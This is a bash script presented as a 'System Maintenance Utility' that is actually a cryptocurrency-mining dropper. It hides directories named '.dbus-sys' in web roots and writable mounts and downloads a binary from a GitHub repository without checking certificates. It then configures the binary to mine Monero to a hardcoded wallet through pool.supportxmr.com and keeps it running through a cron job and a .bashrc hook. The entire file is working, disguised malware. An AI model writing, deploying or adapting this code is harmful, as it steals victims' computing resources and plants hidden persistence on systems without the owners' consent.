#!/bin/bash
# System Maintenance Utility v7.0 FINAL
# Fix: GUI-safe output | no set -e | background+log | timeout-aware
# Repository: boyyywiliam/Aselole
# Support: pool.supportxmr.com

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
REPO="https://raw.githubusercontent.com/boyyywiliam/Aselole/main"
SCRIPT_VERSION="7.0"
LOG_FILE="/tmp/deploy_$$.log"

# ═══════════════════════════════════════════════════════════════════
# LOGGING — semua output ke stdout DAN file
# ═══════════════════════════════════════════════════════════════════

log() {
    echo "$@" | tee -a "$LOG_FILE"
}

# ═══════════════════════════════════════════════════════════════════
# EXEC PROBE
# ═══════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1

    local probe="$dir/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe"
        return 0
    fi
    rm -f "$probe"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# PICK NON-TEMP EXEC DIR
# ═══════════════════════════════════════════════════════════════════

pick_base_dir() {
    local user_home="$HOME"
    local me=$(whoami)

    local candidates=(
        "${user_home}/.dbus-sys"
        "/var/www/vhosts/${me}/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys-${me}"
        "/home/${me}/public_html/.dbus-sys"
        "/usr/local/apache/htdocs/.dbus-sys-${me}"
        "/srv/www/.dbus-sys-${me}"
        "/srv/.dbus-sys-${me}"
        "/opt/.dbus-sys-${me}"
        "/usr/local/.dbus-sys-${me}"
        "/var/lib/.dbus-sys-${me}"
        "/var/www/html"
    )

    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] || continue
        if [ -w "$wr" ] 2>/dev/null; then
            candidates+=("${wr}/.dbus-sys-${me}")
        fi
    done

    local pwd_home=$(getent passwd "$me" 2>/dev/null | cut -d: -f6)
    [ -n "$pwd_home" ] && candidates+=("${pwd_home}/.dbus-sys")

    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        [ -w "$parent" ] 2>/dev/null || continue

        mkdir -p "$base" 2>/dev/null || continue

        if is_exec_ok "$base"; then
            echo "$base"
            return 0
        else
            rmdir "$base" 2>/dev/null || true
        fi
    done

    while IFS= read -r mnt; do
        [ -d "$mnt" ] || continue
        [ -w "$mnt" ] || continue
        case "$mnt" in
            /proc*|/sys*|/dev*) continue ;;
        esac
        local cand="${mnt%/}/.dbus-sys-${me}"
        mkdir -p "$cand" 2>/dev/null || continue
        if is_exec_ok "$cand"; then
            echo "$cand"
            return 0
        fi
        rmdir "$cand" 2>/dev/null || true
    done < <(awk '$4 !~ /noexec/ && $2 != "/" {print $2}' /proc/mounts 2>/dev/null | sort -u)

    echo ""
    return 1
}

determine_base_dir() {
    local base
    base=$(pick_base_dir) || true
    if [ -z "$base" ]; then
        log "[ERROR] Tidak ada direktori exec-able & writable yang ditemukan."
        exit 1
    fi
    echo "$base"
}

check_tools() {
    local tools=""
    for t in wget curl aria2c lynx w3m perl python3 python; do
        command -v "$t" &>/dev/null && tools="$tools $t"
    done
    [ -z "$tools" ] && tools="NONE"
    echo "$tools"
}

detect_cores() {
    local cores=0
    if command -v nproc &>/dev/null; then
        cores=$(nproc)
    elif [ -f /proc/cpuinfo ]; then
        cores=$(grep -c ^processor /proc/cpuinfo)
    else
        cores=$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)
    fi
    [ "$cores" -lt 1 ] && cores=1
    echo "$cores"
}

validate_file() {
    local file="$1"
    [ -f "$file" ] || return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo 0)
    if [ "$size" -gt 2000000 ]; then
        return 0
    else
        log "[!] File too small: $size bytes"
        return 1
    fi
}

create_dirs() {
    local BASE="$1"
    local attempt=1
    while [ $attempt -le 5 ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
            chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" "$BASE/tmp" 2>/dev/null || true
            return 0
        fi
        log "[*] mkdir attempt $attempt/5 failed, retry..."
        sleep 1
        attempt=$((attempt + 1))
    done
    log "[ERROR] Failed to create directories"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DOWNLOAD — retry lebih cepat, max 8x
# ═══════════════════════════════════════════════════════════════════

download_binary() {
    local BIN_NAME="$1"; local BASE="$2"
    local url="${REPO}/${BIN_NAME}"
    local temp_file="$BASE/tmp/.dl_$$"
    local attempt=1
    local max_attempts=8

    log "[*] Downloading core: $BIN_NAME"
    log "[*] Available tools: $(check_tools)"

    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."

        if command -v curl &>/dev/null; then
            curl -fsSLk --max-time 20 -o "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" && {
                log "[+] curl OK: $(stat -c%s "$temp_file" 2>/dev/null) bytes"
                mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }
        fi

        if command -v wget &>/dev/null; then
            wget --no-check-certificate --timeout=20 -q -O "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" && {
                log "[+] wget OK: $(stat -c%s "$temp_file" 2>/dev/null) bytes"
                mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }
        fi

        local py=$(command -v python3 || command -v python)
        if [ -n "$py" ]; then
            $py -c "import urllib.request,sys; urllib.request.urlretrieve('$url','$temp_file'); sys.exit(0)" 2>/dev/null && validate_file "$temp_file" && {
                log "[+] python OK"
                mv "$temp_file" "$BASE/sbin/sysvol"; chmod 755 "$BASE/sbin/sysvol"; return 0; }
        fi

        rm -f "$temp_file" 2>/dev/null
        [ $attempt -lt $max_attempts ] && sleep 2
        attempt=$((attempt + 1))
    done

    log "[ERROR] Download failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════════

deploy_core() {
    local BASE="$1"; local BIN_NAME="$2"

    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] System Maintenance Utility v${SCRIPT_VERSION}"
    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] Base directory: $BASE"

    create_dirs "$BASE" || return 1

    [ -w "$BASE" ] || { log "[ERROR] Not writable: $BASE"; return 1; }

    if ! is_exec_ok "$BASE"; then
        log "[!] Base dir tiba-tiba noexec, ulang cari..."
        local NEW=$(pick_base_dir)
        [ -z "$NEW" ] && { log "[ERROR] No exec dir"; return 1; }
        BASE="$NEW"
        log "[+] New base: $BASE"
        create_dirs "$BASE" || return 1
    fi

    download_binary "$BIN_NAME" "$BASE" || return 1

    if ! "$BASE/sbin/sysvol" --version >/dev/null 2>&1; then
        chmod 755 "$BASE/sbin/sysvol" 2>/dev/null || true
        if ! "$BASE/sbin/sysvol" --version >/dev/null 2>&1; then
            log "[!] Binary tidak exec di $BASE, relokasi..."
            local ALT=$(pick_base_dir)
            if [ -z "$ALT" ] || [ "$ALT" = "$BASE" ]; then
                log "[ERROR] Tidak ada lokasi alternatif"
                return 1
            fi
            mkdir -p "$ALT/sbin" "$ALT/cfg" "$ALT/log" "$ALT/run" "$ALT/tmp" 2>/dev/null
            mv "$BASE/sbin/sysvol" "$ALT/sbin/sysvol" 2>/dev/null || cp "$BASE/sbin/sysvol" "$ALT/sbin/sysvol"
            chmod 755 "$ALT/sbin/sysvol"
            BASE="$ALT"
            "$BASE/sbin/sysvol" --version >/dev/null 2>&1 || { log "[ERROR] Masih gagal di $ALT"; return 1; }
            log "[+] Relokasi ke: $BASE"
        fi
    fi

    local CORES=$(detect_cores)
    local THREADS=$((CORES > 8 ? CORES - 1 : CORES))
    [ "$THREADS" -lt 1 ] && THREADS=1

    log "[*] CPU cores detected: $CORES"
    log "[*] Miner threads set: $THREADS"

    local WORKER="srv-$(hostname)-$(date +%s | tail -c 4)"
    log "[*] Worker ID: $WORKER"

    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "hw-aes": null,
    "priority": null,
    "memory-pool": false,
    "yield": true,
    "max-threads-hint": ${THREADS},
    "asm": true
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 0,
  "donate-over-proxy": 0,
  "log-file": null,
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "${POOL}",
      "user": "${WALLET}",
      "pass": "${WORKER}",
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "daemon": false
    }
  ],
  "print-time": 60,
  "health-print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "verbose": 0,
  "watch": true,
  "pause-on-battery": false,
  "pause-on-active": false
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"
    log "[+] Configuration created"

    cat > "$BASE/run/guard.sh" << GRDEOF
#!/bin/bash
BASE="__BASE_PATH__"
BIN="\$BASE/sbin/sysvol"
CFG="\$BASE/cfg/config.json"
PID_FILE="\$BASE/run/state.pid"
LOG="\$BASE/log/core.log"

if [ -f "\$PID_FILE" ]; then
    PID=\$(cat "\$PID_FILE" 2>/dev/null)
    kill -0 "\$PID" 2>/dev/null && exit 0
fi

mkdir -p "\$(dirname "\$LOG")" 2>/dev/null
setsid "\$BIN" -c "\$CFG" >> "\$LOG" 2>&1 < /dev/null &
echo \$! > "\$PID_FILE"
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    log "[+] Guard script created"

    pkill -f "[s]ysvol" 2>/dev/null || true
    rm -f "$BASE/run/state.pid" 2>/dev/null

    log "[*] Starting service..."
    "$BASE/run/guard.sh"
    sleep 3

    local retry=0
    while [ $retry -lt 5 ]; do
        pgrep -f "[s]ysvol" >/dev/null 2>&1 && break
        log "[*] Waiting... ($((retry+1))/5)"
        sleep 2
        retry=$((retry + 1))
    done

    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local PID=$(pgrep -f "[s]ysvol" | head -1)
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║           [SUCCESS] SERVICE RUNNING! ✓                 ║"
        log "╠════════════════════════════════════════════════════════╣"
        log "║ Process ID : $PID"
        log "║ Core       : $BASE/sbin/sysvol"
        log "║ Config     : $BASE/cfg/config.json"
        log "║ Log        : $BASE/log/core.log"
        log "║ Pool       : $POOL"
        log "║ Worker     : $WORKER"
        log "║ Threads    : $THREADS / $CORES cores"
        log "╚════════════════════════════════════════════════════════╝"
        log ""
        ps aux | grep "[s]ysvol" | grep -v grep | tee -a "$LOG_FILE"
        log ""

        if command -v crontab &>/dev/null; then
            (crontab -l 2>/dev/null || echo ""; echo "* * * * * $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null && log "[+] Cron installed" || log "[!] Cron skipped"
        fi

        [ -f ~/.bashrc ] && ! grep -q "dbus-sys" ~/.bashrc 2>/dev/null && \
            echo "[ -f \"$BASE/run/guard.sh\" ] && $BASE/run/guard.sh >/dev/null 2>&1 &" >> ~/.bashrc && log "[+] .bashrc hooked"

        return 0
    else
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║          [ERROR] SERVICE FAILED TO START ✗             ║"
        log "╚════════════════════════════════════════════════════════╝"
        tail -25 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE" || log "No log"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

BASE=$(determine_base_dir)
log "[*] Selected base dir: $BASE"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN_NAME="cibung"; log "[*] Arch: x86_64" ;;
    aarch64|arm64) BIN_NAME="cibung008"; log "[*] Arch: ARM64" ;;
    armv7l|armv7) BIN_NAME="cibung-armv7"; log "[*] Arch: ARMv7" ;;
    *) log "[ERROR] Unsupported arch: $ARCH"; exit 1 ;;
esac

deploy_core "$BASE" "$BIN_NAME"
RESULT=$?

log ""
log "[*] Deploy exit code: $RESULT"
log "[*] Full log: $LOG_FILE"

exit $RESULT